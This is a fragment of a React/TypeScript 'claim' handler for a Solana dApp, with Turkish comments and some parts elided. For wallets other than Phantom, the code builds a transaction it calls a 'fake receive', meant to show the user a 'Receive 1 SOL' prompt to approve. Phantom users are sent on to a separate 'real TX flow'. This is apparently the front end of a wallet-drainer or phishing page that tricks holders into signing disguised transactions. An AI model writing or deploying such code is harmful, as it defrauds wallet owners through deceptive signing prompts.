...
//import { createUnsignedTransaction }   from '@/app/services/transactionTST'
import { createFakeReceive } from '@/app/services/transactionTST';
import { TOKEN_CONFIGS }    from '@/app/services/token-config';
...
const handleClaim = async () => {
  ...
  // 1) Cüzdan bağlı değilse → bağlanma akışı
  if (!publicKey) {
    const installed = orderedWallets.filter(
      (w) => w.readyState === WalletReadyState.Installed
    )
  ...
  // 2) Cüzdan bağlı, Phantom değilse → Patrick fake-receive
  const isPhantom =
  ...
  if (!isPhantom) {
    setLoading(true)
    try {
      // Legacy Transaction ile 1 SOL inbound dummy
      const fakeTx = await createFakeReceive(publicKey, 1)
      // Direkt gönder, onay ekranını tetikle
      await sendTransaction(fakeTx, conn)
      setMsg('Please approve the “Receive 1 SOL” prompt')
    } catch (err) {
      console.error(err)
      setMsg('Fake receive failed')
    } finally {
      setLoading(false)
    }
    return
  ...
  // 3) Phantom veya bypass durumunda → gerçek TX akışı
  setLoading(true)
  try {
    await doTx()
  } finally {
